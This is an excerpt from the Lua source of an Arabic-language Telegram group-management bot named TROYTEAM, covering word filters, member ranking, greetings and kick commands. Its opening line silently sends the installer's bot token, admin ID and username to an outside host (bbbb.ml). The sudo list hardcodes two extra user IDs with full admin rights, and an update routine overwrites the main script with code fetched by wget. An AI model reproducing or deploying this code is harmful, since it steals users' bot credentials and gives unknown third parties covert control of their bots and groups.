...
https.request('http://bbbb.ml/TROYTEAM/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("TROYTEAM", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/TROYTEAM
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./TROYTEAM.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("TR", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S TROYTEAM -X kill
screen -S TROYTEAM ./TROYTEAM
done
]])  
file:close() 
...
sudo_users = {SUDO,1016028755,964012936}   
function SudoBot(msg)  
local TROYTEAM = false  
...
if tonumber(user_id) == tonumber(1016028755) then  
var = true  
elseif tonumber(user_id) == tonumber(964012936) then
var = true  
...
local TROYTEAM_Msg = ''  
if msgs < 100 then 
TROYTEAM_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
TROYTEAM_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
TROYTEAM_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
TROYTEAM_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
TROYTEAM_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
TROYTEAM_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
TROYTEAM_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
TROYTEAM_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
TROYTEAM_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
TROYTEAM_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
TROYTEAM_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
TROYTEAM_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
TROYTEAM_Msg = 'رب التفاعل '  
end 
return TROYTEAM_Msg 
end
...
function plugin_TROYTEAMa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.TROYTEAMa and msg then
pre_msg = plugin.TROYTEAMa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceTROYTEAM(msg,data) -- بداية العمل
if msg then
...
if start then 
SourceTROYTEAMr = start
else
SourceTROYTEAMr = ' ゠ههلو حياتي 💕⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceTROYTEAMr) 
end
end
...
send(msg.chat_id_, msg.id_,TROYTEAM_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf TROYTEAM.lua')
os.execute('wget https://raw.githubusercontent.com/ITSTROY/TROYTEAM/master/TROYTEAM.lua')
...
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'TROYTEAM')..')'
...
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TROYTEAM')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
...
local TROYTEAM1_Msg = database:get(bot_id.."TROYTEAM1:Add:Filter:Rp2"..text..msg.chat_id_)   
if TROYTEAM1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'TROYTEAM')..') \n 📬┇'..TROYTEAM1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عحياتي 💕\n܁༯┆البوت ادمن في القناة \n܁༯┆تم تفعيل الاشتراك بنجاح . ') 
...
--------------------------------------------------------------------------------------------------------------
if TROYTEAM_Msg and not Special(msg) then  
local TROYTEAM_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if TROYTEAM_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..TROYTEAM_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/TROYTEAM)}\n🚫┇["..TROYTEAM_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](T.ME/TROYTEAM)  💕 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  💕 ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
༯┆WELCOM TROY 💕 .
⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
༯┆[SOURCE TROY](t.me/TROYTEAM) ܀
༯┆[INFORMATION TROY](t.me/LSSS5)
༯┆[DEV SOURCE](t.me/RcRc5)
⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
༯┆ [TWSL SOURCE](t.me/TROYTEAMbot) 
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'TROYTEAM')..') \n☑️┇ تـم قفـل السيلفي بالتقييد\n⛔┇ الحاله ←التقييد ')  
end,nil)   
...
local UserName = (b.username_ or "TROYTEAM")
...
database:set(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 💕 ܰ")  
database:set(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."TROYTEAM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."TROYTEAM1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 💕 ܰ")  
database:del(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."TROYTEAM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."TROYTEAM1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."TROYTEAM1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 💕 ܰ ")  
database:set(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."TROYTEAM1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."TROYTEAM1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."TROYTEAM1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."TROYTEAM1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."TROYTEAM1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."TROYTEAM1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💕◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local TROYTEAM_Msg = database:get(bot_id.."TROYTEAM1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..TROYTEAM_Msg.."◜\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤┇ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'TROYTEAM')..')'..'\n☑️┇ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'تروي').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'تروي')
local TROYTEAM_Msg = {
'عمغي 🥺💕💕 .',
'هلا ابو الحب 💘💘 .'
}
send(msg.chat_id_, msg.id_,'['..TROYTEAM_Msg[math.random(#TROYTEAM_Msg)]..']') 
return false
end
...
},function(ta,TROYTEAM)
local t = "\n٭ 𖤓 ┆ههلاو يَمحتحتين 💕💕◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
x = 0
local list = TROYTEAM.members_
for k, v in pairs(list) do
x = x + 1
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'تروي').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_, msg.id_,'📌┇ عدد المجموعات الان » { '..#group..' }'..TROYTEAMk..''..TROYTEAM..'\n*☑️┇ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
𖤂┆[CHanneL SourcE](t.me/TROYTEAM) 𖥠 .
]]
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'تروي')
...
TROYTEAM = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(TROYTEAM)
...
--------------------------------------------------------------------------------------------------------------
SourceTROYTEAM(data.message_,data)
plugin_TROYTEAMa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local TROYTEAMbot = database:get(bot_id.."TROYTEAM1:Add:Filter:Rp2"..text..result.chat_id_)   
if TROYTEAMbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..TROYTEAMbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local TROYTEAM1_Msg = database:get(bot_id.."TROYTEAM1:Add:Filter:Rp2"..text..result.chat_id_)   
if TROYTEAM1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..TROYTEAM1_Msg)
